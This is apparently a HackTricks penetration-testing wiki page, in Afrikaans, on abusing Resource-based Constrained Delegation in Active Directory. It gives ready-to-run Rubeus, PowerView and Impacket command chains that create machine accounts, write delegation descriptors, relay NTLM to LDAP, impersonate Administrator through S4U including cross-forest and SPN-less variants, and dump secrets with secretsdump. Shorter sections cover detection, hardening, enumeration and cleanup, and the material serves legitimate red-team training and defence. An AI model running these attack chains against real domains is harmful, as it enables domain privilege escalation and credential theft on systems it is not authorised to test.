# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) is soortgelyk aan [constrained delegation](constrained-delegation.md), maar die vertrouensrigting is omgekeer. Tradisionele constrained delegation teken aan na watter dienste ’n principal mag delegeer; RBCD teken op die **teikenhulpbron** aan watter principals gebruikers daarheen mag impersonate.<sup>[[12]](#references)</sup>

Die teikenobjek se _**msDS-AllowedToActOnBehalfOfOtherIdentity**_-kenmerk bevat ’n sekuriteitsbeskrywer wat die principals identifiseer wat namens ander identiteite op daardie hulpbron mag optree.

Nog ’n belangrike verskil is dat ’n principal met voldoende **skryftoestemmings op ’n masjienrekening** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` en soortgelyke regte) moontlik _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan stel. Om tradisionele constrained delegation op te stel, vereis gewoonlik meer bevoorregte administratiewe toegang.<sup>[[1]](#references)</sup>

Meer presies: die wysiging van klassieke constrained-delegation-instellings word gewoonlik op ’n domeinbeheerder deur `SeEnableDelegationPrivilege` beheer, ’n reg wat tipies deur hoogs bevoorregte administrateurs gehou word. RBCD verskuif die besluit na die teikenobjek se sekuriteitsbeskrywer, dus kan skryftoegang tot die betrokke rekenaarobjek-eienskap voldoende wees sonder daardie gebruikersreg.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuwe konsepte

Die **`TrustedToAuthForDelegation`**-vlag in `userAccountControl` word dikwels beskryf as ’n voorvereiste vir **S4U2Self**, maar dit is onvolledig.\
’n Diensprincipal met ’n SPN kan S4U2Self sonder die vlag aanvra. Met `TrustedToAuthForDelegation` is die teruggestuurde diensticket **forwardable**; daarsonder is die ticket gewoonlik **non-forwardable**.<sup>[[5]](#references)</sup>

Tradisionele constrained delegation verwerp ’n **non-forwardable TGS** in die S4U2Proxy-stap. RBCD kan daardie S4U2Self-ticket aanvaar wanneer die teiken se sekuriteitsbeskrywer die aanvraende diens magtig.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Aanvalstruktuur

> As jy **skryf-ekwivalente voorregte** op ’n **rekenaarrekening** het, kan jy moontlik bevoorregte toegang tot daardie masjien verkry.

Gestel die aanvaller het reeds **skryf-ekwivalente voorregte op die slagofferrekenaarobjek**.

1. Die aanvaller **kompromitteer** ’n rekening met ’n **SPN** of **skep een** ("Service A"). By verstek kan ’n geverifieerde domeingebruiker tot 10 rekenaarobjekte skep, soos bepaal deur **_MachineAccountQuota_**; ’n rekenaarobjek verskaf outomaties bruikbare SPN’s.
2. Die aanvaller **misbruik sy WRITE-voorreg** op die slagofferrekenaar (ServiceB) om **resource-based constrained delegation op te stel sodat ServiceA enige gebruiker teenoor daardie slagofferrekenaar (ServiceB) kan impersonate**.
3. Die aanvaller gebruik Rubeus om ’n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) van Service A na Service B uit te voer vir ’n gebruiker **met bevoorregte toegang tot Service B**.
   1. S4U2Self (vanaf die gekompromitteerde of geskepte SPN-rekening): vra ’n **TGS aan wat Administrator aan Service A verteenwoordig** (non-forwardable).
   2. S4U2Proxy: gebruik daardie **non-forwardable TGS** om ’n diensticket aan te vra wat **Administrator** teenoor die **slagoffergasheer** verteenwoordig.
   3. Die non-forwardable-ticket kan steeds in hierdie RBCD-vloei werk omdat Service A in die teikenhulpbron se sekuriteitsbeskrywer gemagtig is.
4. Die aanvaller kan **pass-the-ticket** gebruik en die gebruiker **impersonate** om **toegang tot die slagoffer-ServiceB** te verkry.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` sluit die verstekroete vir die skep van rekenaars uit, maar verwyder nie skryftoestemmings op die teikenrekenaarobjek of beheer oor ’n bestaande rekening nie. ’n Beheerde gewone gebruiker sonder ’n SPN kan soms as die delegerende principal gebruik word deur die [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), ook binne een domein. Dié roete vereis steeds ’n effektiewe RBCD-skryftoestemming, beheer oor die delegerende gebruiker se geloofsbriewe, ’n identiteit wat gedelegeer mag word, versoenbare Kerberos-enkripsiegedrag en ’n NT-hash-verandering wat die rekening ontwrig. Behandel dit as afsonderlike voorvereistes; ’n leë RBCD-kenmerk of nulkwota bewys op sigself nóg sukses nóg veiligheid.

’n Bestaande RBCD-beskrywer kan ook ’n **groep** noem in plaas van die delegerende rekenaar direk. As jy ’n rekenaarrekening met ’n SPN beheer en dit by daardie groep kan voeg, kan die nuwe lidmaatskap die delegeringsroete verskaf sonder om die teikenrekenaar se RBCD-kenmerk te verander. Gaan die groep se effektiewe ACL vir lidmaatskapskryftoegang (insluitend deny ACEs), geneste lidmaatskap en tokenverversing, die trustee-SID in die beskrywer, die geimpersonate rekening se delegeringsbeperkings en die teikendiens se SPN na voordat jy besluit of die roete werk.

Om die _**MachineAccountQuota**_ van die domein na te gaan, kan jy die volgende gebruik:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Aanval

### Skep 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurasie van Resource-based Constrained Delegation

**Gebruik van die Active Directory PowerShell-module**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Gebruik van PowerView**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Uitvoering van ’n volledige S4U attack (Windows/Rubeus)

Eerstens het ons die nuwe rekenaarobjek met die wagwoord `123456` geskep, dus benodig ons die hash van daardie wagwoord:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Dit sal die RC4- en AES-hashes vir daardie rekening vertoon.\
Nou kan die aanval uitgevoer word:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Jy kan meer tickets vir meer dienste genereer deur net een keer te vra met Rubeus se `/altservice`-parameter:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Gebruikers kan gemerk word as **"Account is sensitive and cannot be delegated."** As daardie vlag geaktiveer is, kan die rekening nie deur hierdie delegasievloei nageboots word nie. BloodHound wys hierdie eienskap tydens ontleding.

### Linux-gereedskap: end-tot-end RBCD met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD-ketting met die amptelike Impacket-gereedskap uitvoer:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notas
- As LDAP signing/LDAPS afgedwing word, gebruik `impacket-rbcd -use-ldaps ...`.
- Verkies AES-sleutels; baie moderne domeine beperk RC4. Impacket en Rubeus ondersteun albei AES-only-vloeie.
- Impacket kan die `sname` ("AnySPN") vir sommige tools herskryf, maar verkry waar moontlik die korrekte SPN (bv. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflektiewe RBCD vir 'n Kerberos-only-delegeerder sonder SPN

'n Gekompromitteerde gebruiker met **`msDS-AllowedToDelegateTo` maar sonder 'n SPN of `TrustedToAuthForDelegation`** kan nie met gewone S4U2Self die forwardable-bewyskaartjie vervaardig wat nodig is vir [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) nie.<sup>[[1]](#references)[[18]](#references)</sup> As daardie gebruiker RBCD op sy **eie** AD-objek kan skryf, kan 'n aanvallerbeheerde rekening met 'n SPN eers *aan die gebruiker* delegeer.<sup>[[1]](#references)[[18]](#references)</sup> Hierdie RBCD-hop lewer 'n forwardable-kaartjie vir die nagebootste gebruiker aan die rekening sonder 'n SPN; dit dien as bewys vir 'n tweede S4U2Proxy na 'n SPN in die gekompromitteerde rekening se klassieke delegasietoelatingslys.<sup>[[18]](#references)[[19]](#references)</sup>

Vir die eerste hop sonder 'n SPN moet die helperrekening se S4U2Proxy-versoek **U2U** gebruik: `enc-tkt-in-skey` laat die KDC die kaartjie met die delegeerder se TGT-sessiesleutel enkripteer, eerder as om 'n SPN-sleutel op te soek.<sup>[[18]](#references)[[19]](#references)</sup> Die KDC benodig ook die RBCD-bis in `PA-PAC-OPTIONS`, die delegeerder se TGT en die S4U2Self-bewyskaartjie.<sup>[[18]](#references)[[20]](#references)</sup> Die outeur se Impacket-`getST.py`-fork voeg `-nospn` en `-tgt` vir hierdie versoek by; die ondersteuning vir `-nospn`/`-tgt` is in upstream Impacket PR #2324, dus gebruik die gekoppelde fork eerder as om te aanvaar dat standaard-`getST.py` hierdie stap ondersteun.<sup>[[18]](#references)[[20]](#references)</sup>

Hierdie voorbeeld veronderstel dat `svc_web` gekompromitteer is, sy eie RBCD-kenmerk mag skryf en toegelaat word om aan `host/dc01.corp.local` te delegeer. Dit veronderstel ook dat 'n helper met 'n SPN geskep kan word, RC4 toegelaat word en die gekose `Administrator` delegeerbaar is. Versoek 'n **RC4 TGT** met die gekompromitteerde rekening se NT-hash. Voer die **eerste** `getST.py` vanaf die outeur se fork uit; inspekteer die `describeTicket.py`-uitset en vervang die RC4 TGT-sessiesleutel hieronder daarmee. Die laaste `getST.py` kan standaard-Impacket wees. Versoek die TGT **voordat** jy die NT-hash verander; hierdie verandering ontwrig die diensrekening totdat sy wagwoord teruggestel word.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Anders as die [SPN-less RBCD-roete hieronder](#spn-less-cross-domain--cross-forest-rbcd), gebruik hierdie ketting die SPN-less rekening as die **RBCD-teiken en daarna die klassieke KCD-delegeerder**. Dit benodig steeds ’n ander beheerde rekening met ’n SPN. As `MachineAccountQuota=0`, kan ’n reeds beheerde SPN-rekening die nuwe rekenaar vervang; ’n nulkontingent alleen verhoed nie hierdie pad nie.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD oor domein- en woudgrense

As die **delegerende principal** wat jy beheer in ’n **ander domein** (of selfs ’n **ander woud**) as die **hulpbronrekenaar** geleë is, is die misbruik steeds **RBCD**, maar die kaartjievloei is nie meer die gewone enkel-domein-`S4U2Self -> S4U2Proxy` nie.

### RBCD oor domeingrense: konfigureer die vreemde principal volgens SID

Wanneer jy `msDS-AllowedToActOnBehalfOfOtherIdentity` vanuit ’n **ander domein** instel, is die vreemde masjien/gebruiker dalk **nie volgens naam oplosbaar** in die LDAP van die teikendomein nie. In daardie geval konfigureer jy die delegeringsinskrywing met die **SID** van die vreemde principal in plaas van sy sAMAccountName/UPN.

Dit is veral relevant wanneer NTLM na LDAP herlei word met `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Aantekeninge:
- `--sid` sê vir `ntlmrelayx.py` om `--escalate-user` as 'n SID te behandel, wat nodig is wanneer die delegerende rekening vreemd is aan die teikendomein.
- Selfs al druk die nutsmiddel `User not found in LDAP` uit, kan die delegasieskryfaksie steeds slaag omdat die sekuriteitsbeskrywer die vreemde SID direk stoor.

### Cross-domain RBCD: cross-realm S4U-volgorde

Sodra die vreemde principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` is, is die werkende cross-domain-vloei:<sup>[[9]](#references)[[13]](#references)</sup>

1. Kry 'n **TGT** vir die delegerende principal vanaf sy eie domein.
2. Versoek 'n **referral TGT** vir `krbtgt/<target-domain>`.
3. Versoek 'n **cross-realm S4U2Self referral** vir die gebruiker wat nageboots word, vanaf die teikendomein se DC.
4. Versoek die werklike **S4U2Self**-kaartjie vir daardie gebruiker terug in die delegatordomein.
5. Voer **S4U2Proxy** in die delegatordomein uit om 'n verwysingskaartjie vir die teikendomein te kry.
6. Voer die finale **S4U2Proxy** op die teikendomein se DC uit om die dienskaartjie vir `cifs/host.target`, `host/host.target`, ens. te kry.

Dit is waarom standaard Linux-nutsmiddels dikwels met cross-domain RBCD misluk:<sup>[[9]](#references)</sup>
- die versoek se **realm** moet dalk verskil van die realm van die TGT wat in die `TGS-REQ` gebruik word
- die ketting vereis **onafhanklike S4U2Proxy-stappe**, nie net `S4U2Self` of `S4U2Self` wat onmiddellik deur 'n enkele `S4U2Proxy` gevolg word nie

### Cross-domain RBCD vanaf Linux

Synacktiv het 'n Impacket-implementering van `getST.py` gepubliseer wat die cross-realm-volgorde vanaf Linux herhaal deur die twee KDC's eksplisiet te hanteer:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

In praktyk is die nuwe argumente:
- `-dc-ip`: DC van die **delegating**-domein
- `-targetdomain`: domein van die **resource computer**
- `-targetdc`: DC van die **resource**-domein

### Cross-forest RBCD-beperkings

Cross-forest RBCD het ’n belangrike beperking: **die gebruiker wat nageboots word, moet aan dieselfde forest as die delegating-principal behoort**. Met ander woorde, as jou beheerde masjienrekening in `valhalla.local` is en die teikenresource in `asgard.local` is, kan jy oor die algemeen **nie willekeurige `asgard.local`-gebruikers via RBCD na daardie resource naboots nie**.<sup>[[9]](#references)</sup>

Dit is steeds uitbuitbaar wanneer:
- die gebruiker in die **delegating forest** ’n **local admin** (of andersins bevoorreg) op die resource-gasheer in die ander forest is
- ’n trust die vereiste verifikasiepad toelaat en die vreemde SID in die teikenrekenaar se sekuriteitsbeskrywer aanvaar word

### Cross-forest RBCD-protokolafwykings

Cross-forest RBCD is nie bloot "cross-domain plus ’n trust" nie. Die waargenome vloei bevat twee afwykings wat algemene tooling histories mis:<sup>[[9]](#references)</sup>

1. ’n Ekstra **S4U2Proxy**-versoek wat **`PA-PAC-OPTIONS=branch-aware`** stel
2. ’n Finale dienskaartjie wat met **RC4** teruggestuur kan word, selfs wanneer ander etypes versoek is

Die praktiese vloei is:

1. Kry ’n TGT vir die delegating-principal in forest A.
2. Versoek **S4U2Self** vir die gebruiker wat nageboots word in forest A.
3. Versoek **S4U2Proxy** in forest A om ’n referral-TGT vir forest B te kry.
4. Stuur ’n tweede **S4U2Proxy** in forest A **sonder** die S4U2Self-kaartjie as ’n bykomende kaartjie, maar met `branch-aware` geaktiveer, om nog ’n referral-TGT vir forest B te kry.
5. Versoek opsioneel ’n normale dienskaartjie in forest B vir die delegating-principal (hierdie kaartjie is nie nodig vir die finale misbruik nie).
6. Gebruik die referral-kaartjies van stappe 3 en 4 om die finale **S4U2Proxy**-kaartjie in forest B aan te vra vir die gebruiker uit forest A wat nageboots word, na die teiken-SPN.

### Cross-forest RBCD vanaf Linux

Dieselfde Synacktiv Impacket-vertakking voeg ’n `-forest`-skakelaar vir hierdie logika by:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekursiewe multi-domein RBCD (3+ domeine)

In **multi-domeinwoude** kan beide **S4U2Self** en **S4U2Proxy** **rekursief** wees in plaas daarvan om ná een verwysing te stop:

- **Rekursiewe S4U2Self**: die eerste `S4U2Self` word na die **domein van die nagebootste gebruiker** gestuur, tussenliggende ouer-/kind-hops word deurkruis met normale `TGS-REQ`-verwysings vir `krbtgt/<REALM>`, en die **finale `S4U2Self`** word in die **eie domein van die delegerende principal** gestuur.
- Dit beteken dat **die blote besit van ’n TGT** vir ’n masjienrekening genoeg kan wees om ’n **admin van ’n ander domein in dieselfde forest** na te boots en `cifs/host`, `host/host`, `wsman/host`, ens. aan te vra.
- **Rekursiewe S4U2Proxy** volg die trustketting op dieselfde manier: tussenliggende hops hergebruik die vorige ticket as die TGT terwyl die volgende `krbtgt/<REALM>`-verwysing aangevra word, en slegs die laaste hop lewer die finale service ticket.<sup>[[10]](#references)</sup>

’n Praktiese voorbeeld binne dieselfde forest is:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less RBCD oor domeine/foreste heen

As die **delegating principal ’n gebruiker sonder ’n SPN is**, misluk die laaste rekursiewe `S4U2Self` met **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Die oplossing is om **slegs die finale stap weer as `S4U2Self+U2U` te probeer**.<sup>[[10]](#references)</sup>

Kort weergawe van die misbruikketting:

1. Staaf met die **NT hash** sodat die KDC na **RC4-HMAC (etype 23)** gestuur word.
2. Versoek eers **`-self -u2u`** en hou dié kaartjie apart van die latere proxy-stap.
3. Onttrek die **TGT-session key** met `describeTicket.py`.
4. Vervang die gebruiker se **NT hash** met dié **session key** deur `changepasswd.py -newhashes <session_key>` te gebruik.
5. Hergebruik die `S4U2Self+U2U`-kaartjie as die **`-additional-ticket`** tydens ’n afsonderlike **`-proxy`**-versoek.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operasionele voorbehoude:

- Wanneer die **eerste vertroude hop reeds ’n ander forest is**, verkies die **branch-aware** algoritme (`getST.py ... -forest`) om by die oorspronklike Windows-gedrag te pas. As die foreign forest eers **later** in die ketting bereik word, kan die nie-branch-aware rekursiewe vloei steeds werk.<sup>[[9]](#references)</sup>
- Op onlangse **Windows Server 2022/2025** DC's kan afgedwonge RC4 misluk met **`KDC_ERR_ETYPE_NOSUPP`** weens RC4 se uitfasering; dit kan **SPN-less RBCD** onmoontlik maak, al werk klassieke SPN-gesteunde RBCD steeds met AES.<sup>[[15]](#references)</sup>
- Voer **`S4U2Self+U2U` uit voordat jy die gebruiker se hash/wagwoord verander**: `SamrChangePasswordUser` herbereken nie die rekening se Kerberos AES-sleutels nie, dus kan ’n wagwoordverandering vooraf latere kaartjieversoeke laat misluk.<sup>[[14]](#references)</sup>
- Die nagebootste rekening moet steeds **delegable** wees: **Protected Users** en rekeninge met **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokkeer die ketting.

## Opsporings- / verhardingsnotas

- RBCD-paaie oor domeine/forests word steeds gewoonlik deur **ACL-misbruik** of **relay-to-LDAP** geskep. Dwing **LDAP signing** en **LDAP channel binding** op DC's af om algemene opstellingspaaie te blokkeer.
- Oudit wie `msDS-AllowedToActOnBehalfOfOtherIdentity` op rekenaarobjekte kan skryf, en los die gestoorde SID's op, insluitend **foreign security principals**.
- In omgewings met baie trusts, hersien **Selective Authentication**, **SID filtering**, en of gebruikers van ’n foreign forest **local admin**-regte op hulpbronhosts het.

### Toegang verkry

Die laaste opdragreël sal die **volledige S4U-aanval uitvoer en die TGS** van Administrator na die slagofferhost in **geheue** inspuit.\
In hierdie voorbeeld is ’n TGS vir die **CIFS**-diens van Administrator aangevra, dus sal jy toegang tot **C$** hê:

```bash
ls \\victim.domain.local\C$
```

### Misbruik verskillende dienskaartjies

Kom meer te wete oor die [**beskikbare dienskaartjies hier**](silver-ticket.md#available-services).

## Enumerering, ouditering en opruiming

### Enumerering van rekenaars met RBCD ingestel

PowerShell (dekodering van die SD om SID's te identifiseer):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (lees of spoel met een opdrag):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Opruiming / terugstel van RBCD

- PowerShell (maak die attribuut skoon):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos opgestel is om nie DES of RC4 te gebruik nie, en dat jy net die RC4-hash verskaf. Verskaf minstens die AES256-hash aan Rubeus (of verskaf net die rc4-, aes128- en aes256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tydens `-self` vir ’n gewone gebruiker: die delegerende principal het waarskynlik **geen SPN nie**. Probeer die **laaste hop** weer as **`S4U2Self+U2U`** in plaas van ’n gewone `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tydens **SPN-lose RBCD**: onlangse DC's kan die afgedwonge **RC4-HMAC**-roete verwerp wat deur die `S4U2Self+U2U`- en sessiesleutel-substitusie-truuk vereis word. Probeer eerder ’n klassieke **SPN-gesteunde** RBCD-roete met AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar verskil van dié op die DC, en dat Kerberos nie behoorlik werk nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy het dalk vergeet om die "$" by die gebruikersnaam in te sluit toe jy die hashes gegenereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** tydens S4U2Proxy: Gaan die gedelegeerde rekening se delegeringsbeperkings, die bewyskaartjie se forwardable-vlag, en of klassieke KCD of die teiken se RBCD-descriptor hierdie hop magtig, na. Dit is ’n **KDC-delegeringsbeleidsfout**, nie ’n toets om vas te stel of die teikendiens loop of die gebruiker toegang op toepassingsvlak het nie. ’n Teiken-SPN wat nie geregistreer is nie, lewer gewoonlik eerder **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** op.<sup>[[21]](#references)[[22]](#references)</sup>

## Notas, relays en alternatiewe

- Jy kan die RBCD SD ook oor AD Web Services (ADWS) skryf as LDAP gefiltreer word. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-relaykettings eindig dikwels by RBCD om in een stap plaaslike SYSTEM te verkry. Sien praktiese voorbeelde van begin tot einde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- As LDAP signing/channel binding **gedeaktiveer** is en jy ’n masjienrekening kan skep, kan tools soos **KrbRelayUp** ’n afgedwonge Kerberos-auth na LDAP relay, `msDS-AllowedToActOnBehalfOfOtherIdentity` vir jou masjienrekening op die teikenrekenaarobjek stel, en onmiddellik **Administrator** via S4U vanaf ’n ander host naboots.<sup>[[8]](#references)</sup>

## References

- [1] [Die hond swaai: Misbruik van hulpbron-gebaseerde beperkte delegering om Active Directory aan te val](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Nog ’n woord oor delegering – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos-hulpbrongebaseerde beperkte delegering: Oorname van rekenaarobjekte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Misbruik van hulpbrongebaseerde beperkte delegering](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity het die domein vernietig: ’n Oorsig van offensiewe Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (amptelik)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Vinnige Linux-cheatsheet met onlangse sintaksis](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing af → Kerberos-relay na RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Ondersoek na RBCD tussen domeine en woude](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Ondersoek na RBCD tussen domeine en woude: deel 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket-tak - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
